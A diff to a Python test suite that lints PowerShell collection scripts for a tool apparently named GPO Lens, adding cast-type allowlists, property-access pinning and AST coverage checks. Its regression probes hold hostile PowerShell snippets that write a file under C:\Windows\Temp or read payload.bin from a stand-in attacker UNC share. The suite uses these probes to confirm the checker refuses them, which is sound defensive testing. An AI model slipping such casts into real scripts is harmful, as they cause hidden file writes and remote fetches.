+                "if (-not $GmsaAccount) after []",
+                "if-condition after []",
+            ),
+        ),
+        (
+            "$Credential.GetNetworkCredential().Password",
+            (
+                "if ($MyInvocation.InvocationName -ne '.') after []",
+                "guard if ($Unregister) -> return",
+                (
+                    "guard if (-not [datetime]::TryParseExact($At, 'HH:mm', "
+                    "[Globalization.CultureInfo]::InvariantCulture, "
+                    "[Globalization.DateTimeStyles]::None, [ref]$scheduleTime)) -> throw"
+                ),
+                (
+                    'guard if (-not $PSCmdlet.ShouldProcess($TaskName, "Register collection as '
+                    '$account every $EveryDays day(s) at $At; limit $ExecutionTimeLimit")) -> '
+                    "return"
+                ),
+                "if (-not $GmsaAccount) after []",
+                (
+                    "guard if (-not $Credential -or $Credential.UserName -ne $ServiceAccount) "
+                    "-> throw"
+                ),
+            ),
+        ),
     ),
 }
 
@@ -8952,6 +11317,8 @@ def _canonicalize(entry: dict[str, Any]) -> dict[str, Any]:
         cond["function"] = _cf(cond["function"])
     for pin in entry["pipeline_inputs"]:
         pin["function"] = _cf(pin["function"])
+    for prop in entry["properties"]:
+        prop["function"] = _cf(prop["function"])
     for key in ("member_assignments", "index_assignments"):
         for item in entry[key]:
             item["function"] = _cf(item["function"])
@@ -9331,10 +11698,75 @@ def check_dotnet(script: str, entry: dict[str, Any]) -> None:
     _exact("property assignments", script, assigned, policy.member_assignments)
 
 
+# Types whose *construction/conversion* has no external side effect. A cast or
+# ``-as`` to any other type is refused (Sol round 8: `[System.IO.StreamWriter]
+# 'C:\\...\\x'` creates/truncates a file; `[System.IO.StreamReader]<UNC>` opens
+# a remote read). Matches adcs-lens: allow inert value/collection types only.
+_INERT_CAST_TYPES = frozenset(
+    {
+        "string",
+        "char",
+        "char[]",
+        "int",
+        "int[]",
+        "long",
+        "double",
+        "decimal",
+        "bool",
+        "byte",
+        "byte[]",
+        "datetime",
+        "timespan",
+        "guid",
+        "version",
+        "hashtable",
+        "ordered",
+        "pscustomobject",
+        "array",
+        "object[]",
+        "ref",  # [ref]$v for a TryParse out-parameter; the receiver is pinned
+        "void",  # [void]expr discards a value
+        "switch",
+        "scriptblock",
+    }
+)
+# Parameter type constraints the scripts declare (param([T]$x)); a new one is a
+# reviewed edit. These only type a parameter, they do not construct anything.
+_ALLOWED_PARAMETER_TYPES = frozenset(
+    {
+        "string",
+        "int",
+        "switch",
+        "byte[]",
+        "timespan",
+        "scriptblock",
+        "pscredential",
+        "system.management.automation.pscredential",
+    }
+)
+
+
+def check_cast_types(script: str, entry: dict[str, Any]) -> None:
+    casts = sorted({_cf(t) for t in entry["cast_types"]})
+    forbidden = [t for t in casts if t not in _INERT_CAST_TYPES]
+    assert not forbidden, (
+        f"{script}: cast/conversion to a type with side-effecting construction "
+        f"is not allowed: {forbidden}"
+    )
+    params = sorted({_cf(t) for t in entry["parameter_types"]})
+    unexpected = [t for t in params if t not in _ALLOWED_PARAMETER_TYPES]
+    assert not unexpected, f"{script}: parameter type outside the allowlist: {unexpected}"
+
+
 def check_types(script: str, entry: dict[str, Any]) -> None:
     refs = list(entry["type_references"])
     for assignment in entry["member_assignments"]:
         refs += assignment.get("receiver_types", [])
+    # Cast targets are governed by the inert allowlist (check_cast_types); type
+    # literals used as a `::` receiver are governed by the static-method
+    # allowlist. Here keep the denylist over type references and member-receiver
+    # types as the backstop (a scriptblock/pscredential *parameter* type is
+    # legitimate and is not a construction).
     hits = sorted({t for t in refs if any(s in _cf(t) for s in _FORBIDDEN_TYPE_SUBSTRINGS)})
     assert not hits, f"{script}: forbidden .NET/COM/AD type reference: {hits}"
 
@@ -9636,9 +12068,13 @@ def check_ast(script: str, entry: dict[str, Any]) -> None:
         f"{script}: background jobs (`&`) are not allowed: {entry['background_pipelines']}"
     )
     for row in entry["ast_rows"]:
-        if row[2] == "ForEachStatementAst":
+        if row[2] in ("ForEachStatementAst", "SwitchStatementAst"):
+            # Any foreach/switch flag (-Parallel, switch -regex/-wildcard/
+            # -casesensitive) changes matching/execution semantics; the op
+            # context does not record switch flags, so refuse them here (the
+            # scripts use a plain `foreach` and a plain `switch`). Sol round 8.
             flags = dict(row[3]).get("Flags", "None")
-            assert flags == "None", f"{script}: foreach -Parallel is not allowed"
+            assert flags == "None", f"{script}: a {row[2]} flag ({flags}) is not allowed"
     assert entry["source_non_ascii_bytes"] == 0, (
         f"{script}: source has {entry['source_non_ascii_bytes']} non-ASCII bytes"
     )
@@ -9712,6 +12148,12 @@ def _guarded_ops(script: str, inv: dict[str, dict[str, Any]]) -> list[tuple[str,
     # pinned and the rest compared as a name set.
     for member in entry["members"]:
         ops.append((_norm(member["text"]), tuple(_norm(c) for c in member["context"])))
+    # EVERY property access (getter/setter), same as calls: Sol round 8 showed a
+    # getter can have a side effect (`([IO.FileInfo]$unc).Length` stats a remote
+    # path, `([IO.DirectoryInfo]$unc).Exists`). check_cast_types refuses the
+    # cast; this pins the access text+context as a second layer.
+    for prop in entry["properties"]:
+        ops.append((_norm(prop["text"]), tuple(_norm(c) for c in prop["context"])))
     return ops
 
 
@@ -9834,6 +12276,10 @@ def _string_literals(entry: dict[str, Any]) -> list[str]:
 
 
 def check_remote_literals(script: str, entry: dict[str, Any]) -> None:
+    """Every UNC/`//host`/device/URL-looking string literal must be in the
+    committed REMOTE_LITERALS set. Exempt entries are the domain's own SYSVOL
+    Policies share (the one deliberate remote read) and the `(\\+)$` regex in
+    ConvertTo-GpoLensTaskArgument (a backslash-doubling pattern, not a path)."""
     found = {v for v in _string_literals(entry) if _REMOTE_LITERAL.search(v)}
     unexpected = sorted(found - REMOTE_LITERALS[script])
     assert not unexpected, f"{script}: remote/UNC/URL-looking string literals: {unexpected}"
@@ -10013,6 +12459,7 @@ def _named_checks(local: set[str], inv: dict[str, dict[str, Any]]) -> dict[str, 
     return {
         "ast": check_ast,
         "statement_digests": check_statement_digests,
+        "cast_types": check_cast_types,
         "pipeline_inputs": check_pipeline_inputs,
         "commands": lambda s, e: check_commands(s, e, local),
         "local_functions": check_local_functions,
@@ -10201,6 +12648,7 @@ def test_policy_tables_cover_every_script() -> None:
         ("SCRIPT_HEADERS", SCRIPT_HEADERS),
         ("STATEMENT_DIGESTS", STATEMENT_DIGESTS),
         ("PIPELINE_INPUTS", PIPELINE_INPUTS),
+        ("REMOTE_LITERALS", REMOTE_LITERALS),
         ("SECRET_VARIABLES", SECRET_VARIABLES),
         ("REMOTE_LITERALS", REMOTE_LITERALS),
         ("GUARDED_OPS", GUARDED_OPS),
@@ -11335,6 +13783,34 @@ _REGRESSIONS: list[Probe] = [
         # GUID assembled so tests/test_fixture_guid_lint.py sees no bare literal.
         "[void]$knownIds.Add('" + "-".join(("1" * 8, "1" * 4, "1" * 4, "1" * 4, "1" * 12)) + "')\n",
     ),
+    # --- Round-8 candidates (Sol): implicit construction / side-effecting getters ---
+    (
+        "r8s_implicit_streamwriter",
+        "Run-GpoLensCollection.ps1",
+        "append",
+        "$null = [System.IO.StreamWriter]'C:\\Windows\\Temp\\gpo-lens-review.txt'\n",
+    ),
+    (
+        "r8s_implicit_streamreader_unc",
+        "Run-GpoLensCollection.ps1",
+        "append",
+        "$null = [System.IO.StreamReader](-join ([char]92, [char]92, "
+        "'attacker.example.test\\share\\payload.bin'))\n",
+    ),
+    (
+        "r8s_fileinfo_length_unc",
+        "Run-GpoLensCollection.ps1",
+        "append",
+        "$null = ([System.IO.FileInfo](-join ([char]92, [char]92, "
+        "'attacker.example.test\\share\\payload.bin'))).Length\n",
+    ),
+    (
+        "r8s_directoryinfo_exists_unc",
+        "Run-GpoLensCollection.ps1",
+        "append",
+        "$null = ([System.IO.DirectoryInfo](-join ([char]92, [char]92, "
+        "'attacker.example.test\\share'))).Exists\n",
+    ),
 ]
 
 # NON-BL-3: the regression suite asserts WHICH substantive check flagged each
@@ -11467,6 +13943,10 @@ _PROBE_EXPECTED_CHECK: dict[str, str] = {
     "r7s_computed_unc_readallbytes": "guarded_ops",
     "r7s_pipeline_injected_sysvol_source": "pipeline_inputs",
     "r7s_suppress_coverage_gap_with_add": "guarded_ops",
+    "r8s_implicit_streamwriter": "cast_types",
+    "r8s_implicit_streamreader_unc": "cast_types",
+    "r8s_fileinfo_length_unc": "cast_types",
+    "r8s_directoryinfo_exists_unc": "cast_types",
 }
 
 
@@ -11573,6 +14053,204 @@ def test_golden_catches_semantically_neutral_edits(tmp_path: Path, probe: Probe)
 # Completeness of the syntax-tree serialization (meta-tests).
 # ---------------------------------------------------------------------------
 
+# Projection completeness (Sol round 8 / adcs-lens): every (AST node type,
+# serialized property) the dumper emits is either inspected by a named
+# semantic check or declared inert with a reason. A new PowerShell property
+# (runner upgrade) fails test_every_serialized_property_is_classified until a
+# human classifies it. Keys are 'NodeType.Property'.
+INSPECTED_OR_INERT: dict[str, str] = {
+    "ArrayExpressionAst.SubExpression": "structural: golden + STATEMENT_DIGESTS",
+    "ArrayLiteralAst.Elements": "structural: golden + STATEMENT_DIGESTS",
+    "AssignmentStatementAst.Operator": "binding operator in _binding_key",
+    "AssignmentStatementAst.Left": "binding target pinned by check_bindings/check_pinned_bindings",
+    "AssignmentStatementAst.Right": "binding value pinned (check_pinned_bindings) + required-vars",
+    "AttributeAst.TypeName": "check_ast: attributes serialized; no construction",
+    "AttributeAst.PositionalArguments": "structural: golden + STATEMENT_DIGESTS",
+    "AttributeAst.NamedArguments": "structural: golden + STATEMENT_DIGESTS",
+    "AttributedExpressionAst.Attribute": "structural: golden + STATEMENT_DIGESTS",
+    "AttributedExpressionAst.Child": "structural: golden + STATEMENT_DIGESTS",
+    "BaseCtorInvokeMemberExpressionAst.Static": "refused by check_ast (class-only node)",
+    "BaseCtorInvokeMemberExpressionAst.NullConditional": "refused by check_ast (class-only node)",
+    "BaseCtorInvokeMemberExpressionAst.Expression": "refused by check_ast (class-only node)",
+    "BaseCtorInvokeMemberExpressionAst.Member": "refused by check_ast (class-only node)",
+    "BaseCtorInvokeMemberExpressionAst.GenericTypeArguments": "refused by check_ast (class node)",
+    "BaseCtorInvokeMemberExpressionAst.Arguments": "refused by check_ast (class-only node)",
+    "BinaryExpressionAst.Operator": "structural: golden + STATEMENT_DIGESTS",
+    "BinaryExpressionAst.Left": "structural: golden + STATEMENT_DIGESTS",
+    "BinaryExpressionAst.Right": "structural: golden + STATEMENT_DIGESTS",
+    "BlockStatementAst.Kind": "node type refused by check_ast",
+    "BlockStatementAst.Body": "node type refused by check_ast",
+    "BreakStatementAst.Label": "structural: golden + STATEMENT_DIGESTS",
+    "CatchClauseAst.IsCatchAll": "structural: golden + STATEMENT_DIGESTS",
+    "CatchClauseAst.CatchTypes": "structural: golden + STATEMENT_DIGESTS",
+    "CatchClauseAst.Body": "structural: golden + STATEMENT_DIGESTS",
+    "CommandAst.InvocationOperator": "dynamic invocation (& / .) pinned by check_commands",
+    "CommandAst.DefiningKeyword": "structural: golden + STATEMENT_DIGESTS",
+    "CommandAst.CommandElements": "command name/args pinned by check_commands + _guarded_ops",
+    "CommandAst.Redirections": "check_redirections",
+    "CommandExpressionAst.Expression": "structural: golden + STATEMENT_DIGESTS",
+    "CommandExpressionAst.Redirections": "check_redirections",
+    "CommandParameterAst.ParameterName": "canonicalized + checked (common-param/task vectors)",
+    "CommandParameterAst.Argument": "structural: golden + STATEMENT_DIGESTS",
+    "ConfigurationDefinitionAst.ConfigurationType": "refused by check_ast (node type)",
+    "ConfigurationDefinitionAst.InstanceName": "refused by check_ast (node type)",
+    "ConfigurationDefinitionAst.Body": "refused by check_ast (node type)",
+    "ConstantExpressionAst.Value": "structural: golden + STATEMENT_DIGESTS",
+    "ContinueStatementAst.Label": "structural: golden + STATEMENT_DIGESTS",
+    "ConvertExpressionAst.Type": "check_cast_types (inert cast allowlist)",
+    "ConvertExpressionAst.Child": "structural: operand recursed",
+    "DataStatementAst.Variable": "node type refused by check_ast",
+    "DataStatementAst.CommandsAllowed": "node type refused by check_ast",
+    "DataStatementAst.Body": "node type refused by check_ast",
+    "DoUntilStatementAst.Label": "node type refused by check_ast",
+    "DoUntilStatementAst.Body": "node type refused by check_ast",
+    "DoUntilStatementAst.Condition": "node type refused by check_ast",
+    "DoWhileStatementAst.Label": "node type refused by check_ast",
+    "DoWhileStatementAst.Body": "node type refused by check_ast",
+    "DoWhileStatementAst.Condition": "node type refused by check_ast",
+    "DynamicKeywordStatementAst.CommandElements": "node type refused by check_ast",
+    "ErrorExpressionAst.NestedAst": "refused by check_ast (parse error)",
+    "ErrorStatementAst.Kind": "refused by check_ast (parse error)",
+    "ErrorStatementAst.Flags": "refused by check_ast (parse error)",
+    "ErrorStatementAst.Conditions": "refused by check_ast (parse error)",
+    "ErrorStatementAst.Bodies": "refused by check_ast (parse error)",
+    "ErrorStatementAst.NestedAst": "refused by check_ast (parse error)",
+    "ExitStatementAst.Pipeline": "structural: golden + STATEMENT_DIGESTS",
+    "ExpandableStringExpressionAst.StringConstantType": "structural: golden + STATEMENT_DIGESTS",
+    "ExpandableStringExpressionAst.Value": "check_remote_literals + golden",
+    "ExpandableStringExpressionAst.NestedExpressions": "structural: golden + STATEMENT_DIGESTS",
+    "FileRedirectionAst.FromStream": "check_redirections",
+    "FileRedirectionAst.Append": "check_redirections",
+    "FileRedirectionAst.Location": "check_redirections ($null only)",
+    "ForEachStatementAst.Label": "structural: golden + STATEMENT_DIGESTS",
+    "ForEachStatementAst.Flags": "check_ast refuses -Parallel",
+    "ForEachStatementAst.Variable": "structural: golden + STATEMENT_DIGESTS",
+    "ForEachStatementAst.Condition": "structural: golden + STATEMENT_DIGESTS",
+    "ForEachStatementAst.ThrottleLimit": "structural: golden + STATEMENT_DIGESTS",
+    "ForEachStatementAst.Body": "structural: golden + STATEMENT_DIGESTS",
+    "ForStatementAst.Label": "structural: golden + STATEMENT_DIGESTS",
+    "ForStatementAst.Initializer": "structural: golden + STATEMENT_DIGESTS",
+    "ForStatementAst.Condition": "structural: golden + STATEMENT_DIGESTS",
+    "ForStatementAst.Iterator": "structural: golden + STATEMENT_DIGESTS",
+    "ForStatementAst.Body": "structural: golden + STATEMENT_DIGESTS",
+    "FunctionDefinitionAst.IsFilter": "structural: golden + STATEMENT_DIGESTS",
+    "FunctionDefinitionAst.IsWorkflow": "structural: golden + STATEMENT_DIGESTS",
+    "FunctionDefinitionAst.Name": "structural: golden + STATEMENT_DIGESTS",
+    "FunctionDefinitionAst.Parameters": "structural: golden + STATEMENT_DIGESTS",
+    "FunctionDefinitionAst.Body": "structural: golden + STATEMENT_DIGESTS",
+    "FunctionMemberAst.Name": "refused by check_ast (class node)",
+    "FunctionMemberAst.MethodAttributes": "refused by check_ast (class node)",
+    "FunctionMemberAst.IsPublic": "refused by check_ast (class node)",
+    "FunctionMemberAst.IsPrivate": "refused by check_ast (class node)",
+    "FunctionMemberAst.IsHidden": "refused by check_ast (class node)",
+    "FunctionMemberAst.IsStatic": "refused by check_ast (class node)",
+    "FunctionMemberAst.IsConstructor": "refused by check_ast (class node)",
+    "FunctionMemberAst.Attributes": "refused by check_ast (class node)",
+    "FunctionMemberAst.ReturnType": "refused by check_ast (class node)",
+    "FunctionMemberAst.Parameters": "refused by check_ast (class node)",
+    "FunctionMemberAst.Body": "refused by check_ast (class node)",
+    "HashtableAst.KeyValuePairs": "structural: golden + STATEMENT_DIGESTS",
+    "IfStatementAst.Clauses": "structural: golden + STATEMENT_DIGESTS",
+    "IfStatementAst.ElseClause": "structural: golden + STATEMENT_DIGESTS",
+    "IndexExpressionAst.NullConditional": "structural: golden + STATEMENT_DIGESTS",
+    "IndexExpressionAst.Target": "index-write root pinned by check_bindings",
+    "IndexExpressionAst.Index": "structural: golden + STATEMENT_DIGESTS",
+    "InvokeMemberExpressionAst.Static": "static vs instance split in check_dotnet",
+    "InvokeMemberExpressionAst.NullConditional": "in _guarded_ops text",
+    "InvokeMemberExpressionAst.Expression": "method receiver pinned (check_instance_receivers)",
+    "InvokeMemberExpressionAst.Member": "method call pinned by check_dotnet/_guarded_ops",
+    "InvokeMemberExpressionAst.GenericTypeArguments": "in _guarded_ops text",
+    "InvokeMemberExpressionAst.Arguments": "in _guarded_ops text + closure",
+    "MemberExpressionAst.Static": "property access pinned by _guarded_ops",
+    "MemberExpressionAst.NullConditional": "property access pinned by _guarded_ops (text)",
+    "MemberExpressionAst.Expression": "property receiver pinned by _guarded_ops; recursed",
+    "MemberExpressionAst.Member": "property access pinned by _guarded_ops (text+context)",
+    "MergingRedirectionAst.FromStream": "check_redirections (stream merge only)",
+    "MergingRedirectionAst.ToStream": "check_redirections (stream merge only)",
+    "NamedAttributeArgumentAst.ArgumentName": "structural: golden + STATEMENT_DIGESTS",
+    "NamedAttributeArgumentAst.ExpressionOmitted": "structural: golden + STATEMENT_DIGESTS",
+    "NamedAttributeArgumentAst.Argument": "structural: golden + STATEMENT_DIGESTS",
+    "NamedBlockAst.BlockKind": "structural: golden + STATEMENT_DIGESTS",
+    "NamedBlockAst.Unnamed": "structural: golden + STATEMENT_DIGESTS",
+    "NamedBlockAst.Statements": "structural: golden + STATEMENT_DIGESTS",
+    "NamedBlockAst.Traps": "structural: golden + STATEMENT_DIGESTS",
+    "ParamBlockAst.Attributes": "structural: golden + STATEMENT_DIGESTS",
+    "ParamBlockAst.Parameters": "structural: golden + STATEMENT_DIGESTS",
+    "ParameterAst.Attributes": "structural: golden + STATEMENT_DIGESTS",
+    "ParameterAst.Name": "structural: golden + STATEMENT_DIGESTS",
+    "ParameterAst.DefaultValue": "structural: golden + STATEMENT_DIGESTS",
+    "ParenExpressionAst.Pipeline": "structural: golden + STATEMENT_DIGESTS",
+    "PipelineAst.Background": "check_ast refuses background jobs",
+    "PipelineAst.PipelineElements": "structural: golden + STATEMENT_DIGESTS",
+    "PipelineChainAst.Operator": "node type refused by check_ast",
+    "PipelineChainAst.Background": "check_ast refuses background jobs",
+    "PipelineChainAst.LhsPipelineChain": "node type refused by check_ast",
+    "PipelineChainAst.RhsPipeline": "node type refused by check_ast",
+    "PropertyMemberAst.Name": "refused by check_ast (class node)",
+    "PropertyMemberAst.PropertyAttributes": "refused by check_ast (class node)",
+    "PropertyMemberAst.IsPublic": "refused by check_ast (class node)",
+    "PropertyMemberAst.IsPrivate": "refused by check_ast (class node)",
+    "PropertyMemberAst.IsHidden": "refused by check_ast (class node)",
+    "PropertyMemberAst.IsStatic": "refused by check_ast (class node)",
+    "PropertyMemberAst.PropertyType": "refused by check_ast (class node)",
+    "PropertyMemberAst.Attributes": "refused by check_ast (class node)",
+    "PropertyMemberAst.InitialValue": "refused by check_ast (class node)",
+    "ReturnStatementAst.Pipeline": "structural: golden + STATEMENT_DIGESTS",
+    "ScriptBlockAst.ScriptRequirements": "check_ast refuses #Requires",
+    "ScriptBlockAst.Attributes": "structural: golden + STATEMENT_DIGESTS",
+    "ScriptBlockAst.UsingStatements": "structural: golden + STATEMENT_DIGESTS",
+    "ScriptBlockAst.ParamBlock": "structural: golden + STATEMENT_DIGESTS",
+    "ScriptBlockAst.DynamicParamBlock": "structural: golden + STATEMENT_DIGESTS",
+    "ScriptBlockAst.BeginBlock": "structural: golden + STATEMENT_DIGESTS",
+    "ScriptBlockAst.ProcessBlock": "structural: golden + STATEMENT_DIGESTS",
+    "ScriptBlockAst.EndBlock": "structural: golden + STATEMENT_DIGESTS",
+    "ScriptBlockAst.CleanBlock": "structural: golden + STATEMENT_DIGESTS",
+    "ScriptBlockExpressionAst.ScriptBlock": "structural: golden + STATEMENT_DIGESTS",
+    "StatementBlockAst.Statements": "structural: golden + STATEMENT_DIGESTS",
+    "StatementBlockAst.Traps": "structural: golden + STATEMENT_DIGESTS",
+    "StringConstantExpressionAst.StringConstantType": "structural: golden + STATEMENT_DIGESTS",
+    "StringConstantExpressionAst.Value": "check_remote_literals + golden",
+    "SubExpressionAst.SubExpression": "structural: golden + STATEMENT_DIGESTS",
+    "SwitchStatementAst.Label": "structural: golden + STATEMENT_DIGESTS",
+    "SwitchStatementAst.Flags": "check_ast refuses any non-None switch flag",
+    "SwitchStatementAst.Condition": "structural: golden + STATEMENT_DIGESTS",
+    "SwitchStatementAst.Clauses": "structural: golden + STATEMENT_DIGESTS",
+    "SwitchStatementAst.Default": "structural: golden + STATEMENT_DIGESTS",
+    "TernaryExpressionAst.Condition": "node type refused by check_ast",
+    "TernaryExpressionAst.IfTrue": "node type refused by check_ast",
+    "TernaryExpressionAst.IfFalse": "node type refused by check_ast",
+    "ThrowStatementAst.IsRethrow": "structural: golden + STATEMENT_DIGESTS",
+    "ThrowStatementAst.Pipeline": "structural: golden + STATEMENT_DIGESTS",
+    "TrapStatementAst.TrapType": "node type refused by check_ast",
+    "TrapStatementAst.Body": "node type refused by check_ast",
+    "TryStatementAst.Body": "structural: golden + STATEMENT_DIGESTS",
+    "TryStatementAst.CatchClauses": "structural: golden + STATEMENT_DIGESTS",
+    "TryStatementAst.Finally": "structural: golden + STATEMENT_DIGESTS",
+    "TypeConstraintAst.TypeName": "check_cast_types / check_types",
+    "TypeDefinitionAst.Name": "refused by check_ast (class/enum node)",
+    "TypeDefinitionAst.TypeAttributes": "refused by check_ast (class/enum node)",
+    "TypeDefinitionAst.IsEnum": "refused by check_ast (class/enum node)",
+    "TypeDefinitionAst.IsClass": "refused by check_ast (class/enum node)",
+    "TypeDefinitionAst.IsInterface": "refused by check_ast (class/enum node)",
+    "TypeDefinitionAst.Attributes": "refused by check_ast (class/enum node)",
+    "TypeDefinitionAst.BaseTypes": "refused by check_ast (class/enum node)",
+    "TypeDefinitionAst.Members": "refused by check_ast (class/enum node)",
+    "TypeExpressionAst.TypeName": "check_types denylist; static receiver via check_dotnet",
+    "UnaryExpressionAst.TokenKind": "structural: golden + STATEMENT_DIGESTS",
+    "UnaryExpressionAst.Child": "structural: golden + STATEMENT_DIGESTS",
+    "UsingExpressionAst.SubExpression": "node type refused by check_ast",
+    "UsingStatementAst.UsingStatementKind": "check_usings refuses all using statements",
+    "UsingStatementAst.Name": "check_usings refuses all using statements",
+    "UsingStatementAst.Alias": "check_usings refuses all using statements",
+    "UsingStatementAst.ModuleSpecification": "check_usings refuses all using statements",
+    "VariableExpressionAst.VariablePath": "variable refs pinned (check_bindings/pinned_bindings)",
+    "VariableExpressionAst.Splatted": "splats in required-vars closure",
+    "WhileStatementAst.Label": "structural: golden + STATEMENT_DIGESTS",
+    "WhileStatementAst.Condition": "structural: golden + STATEMENT_DIGESTS",
+    "WhileStatementAst.Body": "structural: golden + STATEMENT_DIGESTS",
+}
+
+
 # Properties the serializer deliberately skips on every node type, and why.
 _EXCLUDED_AST_PROPERTIES = {
     "*.Parent": "back-reference; structure is the row nesting",
@@ -11590,6 +14268,20 @@ _KNOWN_REQUIREMENT_PROPERTIES = {
     "RequiredPSVersion",
     "RequiresPSSnapIns",  # Windows PowerShell 5.1 only
 }
+
+
+def test_every_serialized_property_is_classified() -> None:
+    """adcs-lens projection completeness: every (node type, property) the
+    serializer emits is either inspected by a named semantic check or declared
+    inert (structural / refused node) with a reason in INSPECTED_OR_INERT. A new
+    PowerShell property fails here until a human classifies it (so a
+    side-effecting property can never be silently ignored by the floor)."""
+    described = _run_dumper_raw(_pwsh(), [], "-Describe")
+    pairs = {f"{node}.{prop}" for node, props in described["table"].items() for prop in props}
+    missing = sorted(pairs - set(INSPECTED_OR_INERT))
+    stale = sorted(set(INSPECTED_OR_INERT) - pairs)
+    assert not missing, f"serialized (node, property) pairs not classified: {missing}"
+    assert not stale, f"INSPECTED_OR_INERT has stale entries: {stale}"
 
 
 def test_serializer_covers_every_ast_node_type() -> None:
@@ -11852,6 +14544,7 @@ def test_generator_never_writes_policy(tmp_path: Path, monkeypatch: pytest.Monke
         "LOCAL_FUNCTION_BODIES",
         "STATEMENT_DIGESTS",
         "PIPELINE_INPUTS",
+        "REMOTE_LITERALS",
         "SECRET_USES",
         "SCRIPT_HEADERS",
         "POLICIES",
@@ -12035,6 +14728,39 @@ def test_variable_param_prefixes_and_aliases_are_resolved(tmp_path: Path) -> Non
         if token.casefold() == "pi":
             caught_pi_prefix = True
     assert caught_pi_prefix, "the 2-char prefix -Pi of -PipelineVariable was not exercised"
+
+
+# Sol round 8: the structural STATEMENT_DIGESTS table forces a human edit, but
+# the floor must still refuse a harmful edit even once the digest is updated.
+_POST_DIGEST_FLOOR_PROBES = [
+    "r8s_implicit_streamwriter",
+    "r8s_implicit_streamreader_unc",
+    "r8s_fileinfo_length_unc",
+    "r8s_directoryinfo_exists_unc",
+]
+
+
+@pytest.mark.parametrize("probe_id", _POST_DIGEST_FLOOR_PROBES)
+def test_floor_refuses_after_statement_digest_update(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, probe_id: str
+) -> None:
+    """Replay Sol's probe in post-digest-update form: regenerate the candidate's
+    STATEMENT_DIGESTS entry (as a human would), then the semantic floor must
+    still reject it and the generator must still refuse to write the golden."""
+    probe = next(p for p in _REGRESSIONS if p[0] == probe_id)
+    _, base, position, snippet = probe
+    exe = _pwsh()
+    inv = _modified_inventory(exe, base, position, snippet, tmp_path)
+    # A human updates the structural table to match the edit.
+    updated = {str(st["seq"]): st["digest"] for st in _statements(inv[base])}
+    monkeypatch.setitem(STATEMENT_DIGESTS, base, updated)
+    failed = _run_checks(base, inv)
+    assert "statement_digests" not in failed, f"{probe_id}: digest update did not take"
+    expected = _PROBE_EXPECTED_CHECK[probe_id]
+    assert expected in failed, f"{probe_id}: floor did not refuse post-update: {sorted(failed)}"
+    # And the generator refuses to regenerate the golden for it.
+    with pytest.raises(AssertionError):
+        run_all_checks(base, inv)
 
 
 def test_clean_scripts_pass_all_checks(inventory: dict[str, dict[str, Any]]) -> None:
